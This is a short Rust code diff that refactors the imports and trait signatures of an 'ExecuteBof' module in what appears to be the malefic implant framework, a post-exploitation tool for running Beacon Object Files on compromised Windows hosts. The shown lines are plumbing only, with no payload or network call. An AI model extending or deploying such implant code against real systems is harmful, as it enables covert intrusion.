@@ -1,9 +1,6 @@
-use crate::{check_request, Module, Result, TaskResult};
-use async_trait::async_trait;
-use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::BinaryResponse;
 use malefic_helper::win::kit::bof::bof_loader;
-use malefic_trait::module_impl;
+use crate::prelude::*;
 
 pub struct ExecuteBof {}
 
@@ -12,14 +9,14 @@ pub struct ExecuteBof {}
 impl Module for ExecuteBof {}
 
 #[async_trait]
-impl crate::ModuleImpl for ExecuteBof {
+impl malefic_proto::module::ModuleImpl for ExecuteBof {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut crate::Input,
-        sender: &mut crate::Output,
-    ) -> Result {
+        receiver: &mut malefic_proto::module::Input,
+        sender: &mut malefic_proto::module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let bin = &request.bin;
         let args = &request.args;
